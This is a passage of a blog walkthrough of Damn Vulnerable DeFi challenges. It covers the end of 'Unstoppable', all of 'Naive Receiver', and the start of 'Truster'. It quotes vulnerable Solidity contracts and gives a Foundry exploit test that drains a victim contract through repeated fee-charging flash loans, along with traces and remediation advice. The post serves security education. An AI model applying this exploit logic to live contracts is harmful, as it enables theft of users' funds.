</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>562<span style="color:#728e00">]</span> DVT::balanceOf<span style="color:#728e00">(</span>Unstoppable Lender: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#8a7b52">1000000000000000000000001</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#7f8c8d">&#34;AssertionViolated()&#34;</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#7f8c8d">&#34;AssertionViolated()&#34;</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    └─ ← <span style="color:#728e00">()</span>
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Remediation</p>
<ul>
<li>Remove the strict equality check or replace it with inequality.</li>
<li>Get rid of <code>poolBalance</code> and don&rsquo;t track the pool&rsquo;s balance.</li>
</ul>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Conclusion</p>
<p>Don&rsquo;t rely on your own accounting. The assumption that you can
control contract&rsquo;s balance is wrong.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<p>This SWC is related to forcible sending Ether
(instead of an ERC20 token), but the main idea is the same:
<a href="https://swcregistry.io/docs/SWC-132"  class="external-link" target="_blank" rel="noopener">SWC-132</a> &ndash; Unexpected
Ether balance (from the Smart Contract Weakness Classification
and Test Cases).</p>
<hr>
<p>Thanks for reading!
<a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/test/Levels/unstoppable/Unstoppable.t.sol#L65"  class="external-link" target="_blank" rel="noopener">Here</a>
is the test code with the solution. The next one is
<a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-2-naive-receiver" >#2
Naive Receiver</a>.</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Damn Vulnerable DeFi, #2 Naive Receiver</p>
  <!--list-separator-->
<ul>
<li>
<p>Challenge</p>
 <div class="quote2">
<p>There&rsquo;s a lending pool offering quite expensive flash loans of
Ether, which has 1000 ETH in balance.</p>
<p>You also see that a user has deployed a contract with 10 ETH in
balance, capable of interacting with the lending pool and
receiving flash loans of ETH.</p>
<p>Drain all ETH funds from the user&rsquo;s contract. Doing it in a
single transaction is a big plus ;)</p>
 </div>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>The challenge contains two contracts:</p>
<ul>
<li><code>NaiveReceiverLenderPool</code> &ndash; Lending pool.</li>
<li><code>FlashLoanReceiver</code> &ndash; User&rsquo;s contract for receiveing
flash loans.</li>
</ul>
<p>Same as in the previous challenge, <code>NaiveReceiverLenderPool</code>
inherits <code>ReentrancyGuard</code> and its <code>flashLoan</code> function has the
<code>nonReentrant</code> modifier. So we won&rsquo;t look for re-entrancy
vulnerabilities. It has the <code>receive</code> function, which allows ETH
deposits. I guess it is needed to set up the challenge. The
<code>fixedFee</code> function is trivial. Let&rsquo;s have a closer look at the
<code>flashLoan</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">flashLoan</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">borrower</span>, <span style="color:#00979d">uint256</span> <span style="color:#434f54">borrowAmount</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">external</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">nonReentrant</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">=</span> <span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>).<span style="color:#728e00">balance</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">borrowAmount</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">NotEnoughETHInPool</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#434f54">borrower</span>.<span style="color:#434f54">isContract</span>()) <span style="color:#728e00">revert</span> <span style="color:#434f54">BorrowerMustBeADeployedContract</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Transfer ETH and handle control to receiver
</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">borrower</span>.<span style="color:#434f54">functionCallWithValue</span>(
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#728e00">abi</span>.<span style="color:#728e00">encodeWithSignature</span>(<span style="color:#7f8c8d">&#34;receiveEther(uint256)&#34;</span>, <span style="color:#434f54">FIXED_FEE</span>),
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">borrowAmount</span>
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#728e00">if</span> (<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>).<span style="color:#728e00">balance</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">+</span> <span style="color:#434f54">FIXED_FEE</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">revert</span> <span style="color:#434f54">FlashLoanHasNotBeenPaidBack</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It takes the <code>borrower</code> and checks that it is a contract address
(not an EOA). You might think it would be better to assume that
<code>msg.sender</code> is a borrower, but they&rsquo;ve decided the make it a
parameter for some reason 🤔. Next, it ensures that the pool has
enough funds to lend. Then it calls the <code>receiveEther</code>
function transferring the <code>borrowAmount</code> and passing the
<code>FIXED_FEE</code> constant as an argument. Finally, it checks that the
borrowed amount plus the fixed fee has been repaid.</p>
<p>Now, let&rsquo;s concentrate on the <code>FlashLoanReceiver</code> contract. It
keeps a reference to the pool which is set in the constructor:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#728e00">private</span> <span style="color:#434f54">pool</span>;
</span></span></code></pre></div><p>The <code>receiveEther</code> function checks that the sender is a pool.
Ensures that the contract has enough Ether to repay the
<code>amountToBeRepaid</code>, which is <code>msg.value + fee</code>. Then it executes
the <code>_executeActionDuringFlashLoan</code> and returns funds to the
poll by calling <code>pool.sendValue(amountToBeRepaid)</code>.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">receiveEther</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">fee</span>) <span style="color:#728e00">public</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#728e00">if</span> (<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span> <span style="color:#728e00">!=</span> <span style="color:#434f54">pool</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">SenderMustBePool</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">amountToBeRepaid</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">+</span> <span style="color:#434f54">fee</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#728e00">if</span> (<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>).<span style="color:#728e00">balance</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">amountToBeRepaid</span>)
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#728e00">revert</span> <span style="color:#434f54">CannotBorrowThatMuch</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">_executeActionDuringFlashLoan</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Return funds to pool
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">pool</span>.<span style="color:#434f54">sendValue</span>(<span style="color:#434f54">amountToBeRepaid</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The <code>_executeActionDuringFlashLoan</code> function is empty and has the <code>internal</code> visibility.</p>
<p>Notice that the <code>receiveEther</code> function doesn&rsquo;t check who
initiated the flash loan. It means anyone can request a flash
loan on behalf of the <code>FlashLoanReceiver</code> contract to make it
pay the fee.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Exploit</p>
<p>It turns out we can waste all user’s contract funds on flash
loans with high fees in a single transaction. To do that we must
force it to receive 10 flash loans in a row paying 1 ETH fee
each time:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">testExploit</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT START **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">attacker</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">flashFee</span> <span style="color:#728e00">=</span> <span style="color:#434f54">naiveReceiverLenderPool</span>.<span style="color:#434f54">fixedFee</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">while</span> (<span style="color:#00979d">true</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">flashAmount</span> <span style="color:#728e00">=</span> <span style="color:#00979d">address</span>(<span style="color:#434f54">flashLoanReceiver</span>).<span style="color:#728e00">balance</span> <span style="color:#728e00">-</span> <span style="color:#434f54">flashFee</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">naiveReceiverLenderPool</span>.<span style="color:#434f54">flashLoan</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#00979d">address</span>(<span style="color:#434f54">flashLoanReceiver</span>),
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">flashAmount</span>
</span></span><span style="display:flex;"><span>        );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#00979d">address</span>(<span style="color:#434f54">flashLoanReceiver</span>).<span style="color:#728e00">balance</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">0</span>) <span style="color:#728e00">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT END **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">validation</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here is how the forge&rsquo;s trace looks like:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#728e00">test</span> --match-contract NaiveReceiver -vvvv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Running <span style="color:#8a7b52">1</span> <span style="color:#728e00">test</span> <span style="color:#728e00">for</span> src/test/Levels/naive-receiver/NaiveReceiver.t.sol:NaiveReceiver
</span></span><span style="display:flex;"><span><span style="color:#728e00">[</span>PASS<span style="color:#728e00">]</span> testExploit<span style="color:#728e00">()</span> <span style="color:#728e00">(</span>gas: 187772<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>Logs:
</span></span><span style="display:flex;"><span>  🧨 PREPARED TO BREAK THINGS 🧨
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Traces:
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span>187772<span style="color:#728e00">]</span> NaiveReceiver::testExploit<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>Attacker: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>146<span style="color:#728e00">]</span> Pool::fixedFee<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#8a7b52">1000000000000000000</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>20314<span style="color:#728e00">]</span> Pool::flashLoan<span style="color:#728e00">(</span>Receiver: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 9000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>9598<span style="color:#728e00">]</span> Receiver::receiveEther<span style="color:#728e00">{</span>value: 9000000000000000000<span style="color:#728e00">}(</span>1000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>55<span style="color:#728e00">]</span> Pool::fallback<span style="color:#728e00">{</span>value: 10000000000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>16314<span style="color:#728e00">]</span> Pool::flashLoan<span style="color:#728e00">(</span>Receiver: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 8000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>7598<span style="color:#728e00">]</span> Receiver::receiveEther<span style="color:#728e00">{</span>value: 8000000000000000000<span style="color:#728e00">}(</span>1000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>55<span style="color:#728e00">]</span> Pool::fallback<span style="color:#728e00">{</span>value: 9000000000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>16314<span style="color:#728e00">]</span> Pool::flashLoan<span style="color:#728e00">(</span>Receiver: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 7000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>7598<span style="color:#728e00">]</span> Receiver::receiveEther<span style="color:#728e00">{</span>value: 7000000000000000000<span style="color:#728e00">}(</span>1000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>55<span style="color:#728e00">]</span> Pool::fallback<span style="color:#728e00">{</span>value: 8000000000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>16314<span style="color:#728e00">]</span> Pool::flashLoan<span style="color:#728e00">(</span>Receiver: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 6000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>7598<span style="color:#728e00">]</span> Receiver::receiveEther<span style="color:#728e00">{</span>value: 6000000000000000000<span style="color:#728e00">}(</span>1000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>55<span style="color:#728e00">]</span> Pool::fallback<span style="color:#728e00">{</span>value: 7000000000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>16314<span style="color:#728e00">]</span> Pool::flashLoan<span style="color:#728e00">(</span>Receiver: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 5000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>7598<span style="color:#728e00">]</span> Receiver::receiveEther<span style="color:#728e00">{</span>value: 5000000000000000000<span style="color:#728e00">}(</span>1000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>55<span style="color:#728e00">]</span> Pool::fallback<span style="color:#728e00">{</span>value: 6000000000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>16314<span style="color:#728e00">]</span> Pool::flashLoan<span style="color:#728e00">(</span>Receiver: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 4000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>7598<span style="color:#728e00">]</span> Receiver::receiveEther<span style="color:#728e00">{</span>value: 4000000000000000000<span style="color:#728e00">}(</span>1000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>55<span style="color:#728e00">]</span> Pool::fallback<span style="color:#728e00">{</span>value: 5000000000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>16314<span style="color:#728e00">]</span> Pool::flashLoan<span style="color:#728e00">(</span>Receiver: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 3000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>7598<span style="color:#728e00">]</span> Receiver::receiveEther<span style="color:#728e00">{</span>value: 3000000000000000000<span style="color:#728e00">}(</span>1000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>55<span style="color:#728e00">]</span> Pool::fallback<span style="color:#728e00">{</span>value: 4000000000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>16314<span style="color:#728e00">]</span> Pool::flashLoan<span style="color:#728e00">(</span>Receiver: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 2000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>7598<span style="color:#728e00">]</span> Receiver::receiveEther<span style="color:#728e00">{</span>value: 2000000000000000000<span style="color:#728e00">}(</span>1000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>55<span style="color:#728e00">]</span> Pool::fallback<span style="color:#728e00">{</span>value: 3000000000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>16314<span style="color:#728e00">]</span> Pool::flashLoan<span style="color:#728e00">(</span>Receiver: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 1000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>7598<span style="color:#728e00">]</span> Receiver::receiveEther<span style="color:#728e00">{</span>value: 1000000000000000000<span style="color:#728e00">}(</span>1000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>55<span style="color:#728e00">]</span> Pool::fallback<span style="color:#728e00">{</span>value: 2000000000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>9932<span style="color:#728e00">]</span> Pool::flashLoan<span style="color:#728e00">(</span>Receiver: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 0<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>7598<span style="color:#728e00">]</span> Receiver::receiveEther<span style="color:#728e00">(</span>1000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>55<span style="color:#728e00">]</span> Pool::fallback<span style="color:#728e00">{</span>value: 1000000000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    └─ ← <span style="color:#728e00">()</span>
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Remediation</p>
<ul>
<li>In the <code>NaiveReceiverLenderPool</code>&rsquo;s <code>flashLoan</code> function assume
that <code>msg.sender</code> is the borrower.</li>
<li>Add authentication to the <code>FlashLoanReceiver</code> contract.</li>
</ul>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Notes &amp; References</p>
<p>The
<a href="https://docs.openzeppelin.com/contracts/2.x/api/utils#Address-isContract-address-"  class="external-link" target="_blank" rel="noopener">isContract</a>
and
<a href="https://docs.openzeppelin.com/contracts/2.x/api/utils#Address-sendValue-address-payable-uint256-"  class="external-link" target="_blank" rel="noopener">sendValue</a>
functions come from the
<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol"  class="external-link" target="_blank" rel="noopener">OpenZeppelin&rsquo;s
Address library</a>.</p>
<p>For example, the <code>sendValue</code> is implemented like this:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">sendValue</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#434f54">recipient</span>, <span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">internal</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">require</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>).<span style="color:#728e00">balance</span> <span style="color:#728e00">&gt;=</span> <span style="color:#434f54">amount</span>, <span style="color:#7f8c8d">&#34;Address: insufficient balance&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    (<span style="color:#00979d">bool</span> <span style="color:#434f54">success</span>, ) <span style="color:#728e00">=</span> <span style="color:#434f54">recipient</span>.<span style="color:#728e00">call</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#434f54">amount</span>}(<span style="color:#7f8c8d">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">require</span>(<span style="color:#434f54">success</span>, <span style="color:#7f8c8d">&#34;Address: unable to send value, recipient may have reverted&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><hr>
<p>Thank you for reading!
The complete code is <a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/test/Levels/naive-receiver/NaiveReceiver.t.sol#L49-L65"  class="external-link" target="_blank" rel="noopener">here</a>.
Let&rsquo;s move on to the next challenge &ndash;
<a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-3-truster" >#3
Truster</a>.</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Damn Vulnerable DeFi, #3 Truster</p>
  <!--list-separator-->
<ul>
<li>
<p>Challenge</p>
 <div class="quote2">
<p>More and more lending pools are offering flash loans. In this
case, a new pool has launched that is offering flash loans of
DVT tokens for free.</p>
<p>Currently the pool has 1 million DVT tokens in balance. And you
have nothing.</p>
<p>But don&rsquo;t worry, you might be able to take them all from the
pool. In a single transaction.</p>
 </div>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">12</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">IERC20</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;openzeppelin-contracts/token/ERC20/IERC20.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">Address</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;openzeppelin-contracts/utils/Address.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">ReentrancyGuard</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;openzeppelin-contracts/security/ReentrancyGuard.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">/**
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> * @title TrusterLenderPool
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">TrusterLenderPool</span> <span style="color:#728e00">is</span> <span style="color:#434f54">ReentrancyGuard</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">using</span> <span style="color:#434f54">Address</span> <span style="color:#728e00">for</span> <span style="color:#00979d">address</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">IERC20</span> <span style="color:#728e00">public</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">damnValuableToken</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">NotEnoughTokensInPool</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">FlashLoanHasNotBeenPaidBack</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">tokenAddress</span>) {
